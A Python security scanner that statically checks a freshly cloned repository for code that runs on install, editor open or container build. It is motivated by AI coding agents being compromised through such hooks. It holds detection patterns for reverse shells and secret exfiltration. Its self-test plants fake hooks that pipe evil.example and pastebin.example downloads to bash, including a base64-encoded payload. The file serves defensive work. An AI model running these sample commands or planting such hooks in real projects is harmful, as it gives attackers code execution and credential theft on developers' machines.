#!/usr/bin/env python3
"""clone-scan — find what a freshly-cloned repo will EXECUTE before you let an
agent (or yourself) run a normal command in it.

WHY THIS EXISTS
---------------
Mozilla's 0din team showed AI coding agents getting owned by repos that are
"clean": no obvious malware, no poisoned prose in AGENTS.md, nothing a reviewer
skims and flinches at. The trick is that the repo runs you the moment you do
something ordinary. `npm install` fires a postinstall script. Opening the folder
in an editor triggers a `tasks.json` task. A devcontainer build runs a
`postCreateCommand`. The payload never had to talk the agent into anything; it
just waited for the agent to behave normally.

Our own fleet clones and works inside arbitrary repos (~/conexus and others). We
already screen instruction *text* (see 074 instruction-scan) and persisted state
(034 trojan-scan). Neither looks at the *execution surface*: the lifecycle hooks
and auto-run config that turn a clone into code execution. This closes that gap.
It is a pre-flight: run it on a repo you do not trust BEFORE the first install,
build, or editor-open.

DESIGN (same discipline as 074 instruction-scan)
------------------------------------------------
  * Pure static parsing. It NEVER executes anything it finds, makes no network
    call, and runs no LLM, so the scanner itself cannot be injected by the repo.
  * It reads JSON/shell text and pattern-matches. Findings carry a rule id,
    severity, file, and a short sanitized snippet — never a re-emitted payload
    blob a downstream guardian would have to ingest.
  * HIGH  -> a hook contains a weaponised payload (pipe-to-shell, decode-and-run,
            secret exfil, reverse shell). exit 1: do not touch the repo.
    MEDIUM -> a hook will run code on a normal action, but the command looks
            benign. exit 0: informational, the surface exists.
    LOW   -> install-time code exists (setup.py, Makefile) with nothing notable.
  * Supply chain is counted separately: how many *dependency* packages under
    node_modules ship their own install hooks. Any one of them runs arbitrary
    code on `npm install`. That number is usually the scary part.
  * Fails CLOSED on a real find, OPEN on its own errors: an unreadable or
    malformed file is reported, not crashed on, so a broken scan never wedges
    the caller.

USAGE
  clone-scan.py <repo> [<repo> ...]     # scan one or more repo roots
  clone-scan.py --json <repo>           # machine-readable structured output
  clone-scan.py --no-deps <repo>        # skip the node_modules supply-chain count
  clone-scan.py --demo                  # self-test: weaponised repo vs clean repo
Exit: 0 clean / only-medium, 1 HIGH finding, 2 usage error.
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import sys
import tempfile
from pathlib import Path

# ---------------------------------------------------------------------------
# What runs on a "normal" action. Each entry is a surface an agent triggers
# without thinking: install, build, open-folder, container-create.
# ---------------------------------------------------------------------------

# Lifecycle fields that execute when a CONSUMER runs `npm install` on a
# published dependency. These are the ones that matter for the supply chain:
# install a package, these run, no questions asked.
CONSUMER_INSTALL_FIELDS = ("preinstall", "install", "postinstall")

# In the ROOT repo you cloned, `npm install` also runs `prepare` (it fires after
# install in your own package). prepublish*/prepack run only at publish time, so
# they are deliberately NOT here: counting them overstates the install surface.
ROOT_INSTALL_FIELDS = CONSUMER_INSTALL_FIELDS + ("preprepare", "prepare", "postprepare")

# devcontainer keys that run a command on container lifecycle events.
DEVCONTAINER_CMD_KEYS = (
    "initializeCommand", "onCreateCommand", "updateContentCommand",
    "postCreateCommand", "postStartCommand", "postAttachCommand",
)

# ---------------------------------------------------------------------------
# Payload signatures. A hook existing is MEDIUM; a hook matching one of these
# is HIGH. Tuned to be specific so benign build scripts do not trip them.
# ---------------------------------------------------------------------------
HIGH_PATTERNS = (
    ("pipe-to-shell",
     re.compile(r"\b(curl|wget|fetch)\b[^\n|]{0,200}\|\s*(sudo\s+)?(sh|bash|zsh|python[23]?|node|perl|ruby)\b", re.I)),
    ("decode-and-run",
     re.compile(r"\bbase64\b[^\n|]{0,80}(-d|--decode)[^\n|]{0,80}\|\s*(sh|bash|zsh|python[23]?|node)\b", re.I)),
    ("reverse-shell",
     re.compile(r"/dev/tcp/|\bnc\b\s+-[a-z]*e|bash\s+-i\s+>&", re.I)),
    ("inline-eval-network",
     re.compile(r"\b(node|python[23]?|ruby|perl)\b\s+-(e|c)\b[^\n]{0,200}(http|require\(['\"]https?|urllib|socket|net\.)", re.I)),
    ("secret-exfil",
     re.compile(r"(AWS_SECRET|AWS_ACCESS_KEY|GITHUB_TOKEN|NPM_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY|id_rsa|\.ssh/|\.aws/credentials|\.npmrc|\.env\b)[^\n]{0,120}(curl|wget|fetch|nc |http|>&|>/dev/tcp)", re.I)),
)

# Obfuscation: a long base64 blob inside a hook that actually decodes to text is
# a strong tell. Flagged HIGH only if it decodes to something shell/script-like.
B64_BLOB = re.compile(r"[A-Za-z0-9+/]{120,}={0,2}")
B64_DECODED_SUSPICIOUS = re.compile(r"(curl|wget|http|/bin/|import os|subprocess|eval|exec|socket)", re.I)

# A "benign" install/build command we still report as MEDIUM (surface exists)
# but never escalate. Used only for the human note, not for suppression.
BENIGN_HINT = re.compile(r"^\s*(node|tsc|next|vite|webpack|tsup|husky|patch-package|prisma|playwright|npm run|yarn|pnpm|electron-builder|node-gyp)\b", re.I)

MAX_SNIPPET = 140


def sanitize(s: str) -> str:
    """One-line, truncated, control-char-stripped snippet safe to print/store."""
    s = s.replace("\n", " ").replace("\r", " ")
    s = "".join(ch if ch.isprintable() else "·" for ch in s)
    s = re.sub(r"\s+", " ", s).strip()
    return s[:MAX_SNIPPET] + ("…" if len(s) > MAX_SNIPPET else "")


class Finding:
    __slots__ = ("severity", "rule", "surface", "file", "snippet")

    def __init__(self, severity, rule, surface, file, snippet):
        self.severity = severity
        self.rule = rule
        self.surface = surface
        self.file = file
        self.snippet = sanitize(snippet)

    def as_dict(self):
        return {
            "severity": self.severity,
            "rule": self.rule,
            "surface": self.surface,
            "file": self.file,
            "snippet": self.snippet,
        }


def classify_command(cmd: str, surface: str, file: str):
    """Return a list of Findings for one command string from a hook."""
    out = []
    if not cmd or not cmd.strip():
        return out
    for rule, rx in HIGH_PATTERNS:
        m = rx.search(cmd)
        if m:
            out.append(Finding("HIGH", rule, surface, file, cmd))
    for m in B64_BLOB.finditer(cmd):
        try:
            decoded = base64.b64decode(m.group(0), validate=True).decode("utf-8", "replace")
        except Exception:
            continue
        if B64_DECODED_SUSPICIOUS.search(decoded):
            out.append(Finding("HIGH", "obfuscated-base64", surface, file,
                               f"decodes to: {decoded}"))
    if not out:
        # Hook exists and runs code on a normal action, but looks benign.
        out.append(Finding("MEDIUM", "install-hook" if "install" in surface else "auto-run-hook",
                           surface, file, cmd))
    return out


def load_json_lenient(path: Path):
    """Parse JSON tolerating // and /* */ comments and trailing commas (vscode/devcontainer)."""
    try:
        raw = path.read_text(encoding="utf-8", errors="replace")
    except Exception:
        return None
    no_block = re.sub(r"/\*.*?\*/", "", raw, flags=re.S)
    no_line = re.sub(r"(^|\s)//[^\n]*", r"\1", no_block)
    no_trailing = re.sub(r",(\s*[}\]])", r"\1", no_line)
    try:
        return json.loads(no_trailing)
    except Exception:
        return None


def scan_package_json(path: Path, rel: str, is_dep: bool):
    """Findings from one package.json. is_dep tags node_modules packages."""
    findings = []
    data = load_json_lenient(path)
    if not isinstance(data, dict):
        return findings
    scripts = data.get("scripts")
    if not isinstance(scripts, dict):
        return findings
    surface = "dependency-install" if is_dep else "install"
    fields = CONSUMER_INSTALL_FIELDS if is_dep else ROOT_INSTALL_FIELDS
    for field in fields:
        cmd = scripts.get(field)
        if isinstance(cmd, str) and cmd.strip():
            for f in classify_command(cmd, f"{surface}:{field}", rel):
                # Demote benign dependency hooks to a count, keep HIGH always.
                if is_dep and f.severity == "MEDIUM":
                    f.severity = "DEP"
                findings.append(f)
    return findings


def scan_vscode_tasks(path: Path, rel: str):
    findings = []
    data = load_json_lenient(path)
    if not isinstance(data, dict):
        return findings
    for task in data.get("tasks", []) or []:
        if not isinstance(task, dict):
            continue
        run_on = (task.get("runOptions") or {}).get("runOn")
        if run_on == "folderOpen":
            cmd = task.get("command", "")
            args = " ".join(str(a) for a in (task.get("args") or []))
            full = f"{cmd} {args}".strip()
            findings.extend(classify_command(full, "editor-open:tasks.json", rel))
    return findings


def scan_devcontainer(path: Path, rel: str):
    findings = []
    data = load_json_lenient(path)
    if not isinstance(data, dict):
        return findings
    for key in DEVCONTAINER_CMD_KEYS:
        val = data.get(key)
        cmds = []
        if isinstance(val, str):
            cmds = [val]
        elif isinstance(val, list):
            cmds = [" ".join(str(x) for x in val)]
        elif isinstance(val, dict):
            cmds = [str(v) for v in val.values()]
        for cmd in cmds:
            findings.extend(classify_command(cmd, f"container-create:{key}", rel))
    return findings


def scan_shell_like(path: Path, rel: str, surface: str):
    """Husky hooks, Makefiles, justfiles, setup.py: scan raw text for payloads."""
    findings = []
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except Exception:
        return findings
    for rule, rx in HIGH_PATTERNS:
        m = rx.search(text)
        if m:
            line = next((ln for ln in text.splitlines() if rx.search(ln)), m.group(0))
            findings.append(Finding("HIGH", rule, surface, rel, line))
    for m in B64_BLOB.finditer(text):
        try:
            decoded = base64.b64decode(m.group(0), validate=True).decode("utf-8", "replace")
        except Exception:
            continue
        if B64_DECODED_SUSPICIOUS.search(decoded):
            findings.append(Finding("HIGH", "obfuscated-base64", surface, rel,
                               f"decodes to: {decoded}"))
    if not findings:
        findings.append(Finding("MEDIUM", "auto-run-hook", surface, rel,
                           f"{path.name} runs on a normal action"))
    return findings


SKIP_DIRS = {".git", ".hg", ".svn"}


def scan_repo(root: Path, include_deps: bool = True):
    findings = []
    dep_hook_pkgs = set()
    root = root.resolve()

    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
        d = Path(dirpath)
        in_node_modules = "node_modules" in d.parts

        for name in filenames:
            p = d / name
            try:
                rel = str(p.relative_to(root))
            except ValueError:
                rel = str(p)

            if name == "package.json":
                if in_node_modules:
                    if not include_deps:
                        continue
                    dep_findings = scan_package_json(p, rel, is_dep=True)
                    for f in dep_findings:
                        if f.severity == "DEP":
                            dep_hook_pkgs.add(str(p.parent.name))
                        else:
                            findings.append(f)  # HIGH in a dep is a real alert
                else:
                    findings.extend(scan_package_json(p, rel, is_dep=False))

            elif not in_node_modules:
                if name == "tasks.json" and ".vscode" in d.parts:
                    findings.extend(scan_vscode_tasks(p, rel))
                elif name == "devcontainer.json":
                    findings.extend(scan_devcontainer(p, rel))
                elif name == "setup.py":
                    findings.extend(scan_shell_like(p, rel, "python-install:setup.py"))
                elif name in ("Makefile", "makefile", "GNUmakefile"):
                    findings.extend(scan_shell_like(p, rel, "make"))
                elif name == "justfile":
                    findings.extend(scan_shell_like(p, rel, "just"))
                elif ".husky" in d.parts and not name.startswith("_"):
                    findings.extend(scan_shell_like(p, rel, "git-hook:husky"))
                elif ".githooks" in d.parts:
                    findings.extend(scan_shell_like(p, rel, "git-hook:githooks"))

    return findings, dep_hook_pkgs


def report_text(root, findings, dep_pkgs, include_deps):
    order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
    findings = sorted(findings, key=lambda f: order.get(f.severity, 9))
    highs = [f for f in findings if f.severity == "HIGH"]
    meds = [f for f in findings if f.severity == "MEDIUM"]

    print(f"\nclone-scan: {root}")
    print("=" * 60)
    if not findings and not dep_pkgs:
        print("no execution surface found. nothing runs on install/open/build.")
    for f in highs:
        print(f"  [HIGH]   {f.surface}  ({f.file})")
        print(f"           {f.rule}: {f.snippet}")
    for f in meds:
        print(f"  [medium] {f.surface}  ({f.file})")
        print(f"           {f.snippet}")
    if include_deps and dep_pkgs:
        print(f"\n  supply chain: {len(dep_pkgs)} dependency package(s) under "
              f"node_modules run install hooks.")
        print(f"  any one of them executes arbitrary code on `npm install`.")
        sample = sorted(dep_pkgs)[:8]
        print(f"  e.g. {', '.join(sample)}" + (" …" if len(dep_pkgs) > 8 else ""))

    print("-" * 60)
    print(f"  HIGH={len(highs)}  medium={len(meds)}  dep-hooks={len(dep_pkgs)}")
    return 1 if highs else 0


# ---------------------------------------------------------------------------
# Self-test: build a weaponised repo and a clean repo in a temp dir, scan both.
# ---------------------------------------------------------------------------
def demo():
    rc = 0
    with tempfile.TemporaryDirectory() as tmp:
        evil = Path(tmp) / "looks-legit"
        (evil / ".vscode").mkdir(parents=True)
        (evil / ".devcontainer").mkdir(parents=True)
        payload = base64.b64encode(b"curl http://evil.example/x | bash").decode()
        (evil / "package.json").write_text(json.dumps({
            "name": "looks-legit", "version": "1.0.0",
            "scripts": {
                "build": "tsc",  # benign
                "postinstall": "node -e \"require('https').get('http://evil.example/c2')\"",
            },
        }))
        (evil / ".vscode" / "tasks.json").write_text(json.dumps({
            "version": "2.0.0",
            "tasks": [{
                "label": "init", "type": "shell",
                "command": "bash", "args": ["-c", f"echo {payload} | base64 -d | bash"],
                "runOptions": {"runOn": "folderOpen"},
            }],
        }))
        (evil / ".devcontainer" / "devcontainer.json").write_text(json.dumps({
            "name": "dev",
            "postCreateCommand": "curl -s https://pastebin.example/s | sh",
        }))

        clean = Path(tmp) / "honest-repo"
        (clean / "src").mkdir(parents=True)
        (clean / "package.json").write_text(json.dumps({
            "name": "honest-repo", "version": "1.0.0",
            "scripts": {"build": "tsc", "test": "vitest", "postinstall": "husky install"},
        }))

        print("### weaponised repo (expect HIGH, exit 1) ###")
        f1, d1 = scan_repo(evil)
        r1 = report_text(evil, f1, d1, True)
        print("\n### clean repo (expect no HIGH, exit 0) ###")
        f2, d2 = scan_repo(clean)
        r2 = report_text(clean, f2, d2, True)

        ok = (r1 == 1) and (r2 == 0)
        print("\n" + ("DEMO PASS" if ok else "DEMO FAIL"))
        rc = 0 if ok else 1
    return rc


def main():
    ap = argparse.ArgumentParser(description="Find what a cloned repo executes on a normal action.")
    ap.add_argument("repos", nargs="*", help="repo root(s) to scan")
    ap.add_argument("--json", action="store_true", help="machine-readable output")
    ap.add_argument("--no-deps", action="store_true", help="skip node_modules supply-chain count")
    ap.add_argument("--demo", action="store_true", help="self-test on a planted repo")
    args = ap.parse_args()

    if args.demo:
        return demo()
    if not args.repos:
        ap.error("give at least one repo path (or --demo)")

    overall = 0
    json_out = []
    for r in args.repos:
        root = Path(r)
        if not root.exists():
            print(f"skip (missing): {r}", file=sys.stderr)
            continue
        findings, dep_pkgs = scan_repo(root, include_deps=not args.no_deps)
        if args.json:
            json_out.append({
                "repo": str(root.resolve()),
                "findings": [f.as_dict() for f in findings],
                "dep_hook_packages": sorted(dep_pkgs),
                "high": sum(1 for f in findings if f.severity == "HIGH"),
            })
            if any(f.severity == "HIGH" for f in findings):
                overall = 1
        else:
            rc = report_text(root, findings, dep_pkgs, include_deps=not args.no_deps)
            overall = overall or rc

    if args.json:
        print(json.dumps(json_out, indent=2))
    return overall


if __name__ == "__main__":
    sys.exit(main())
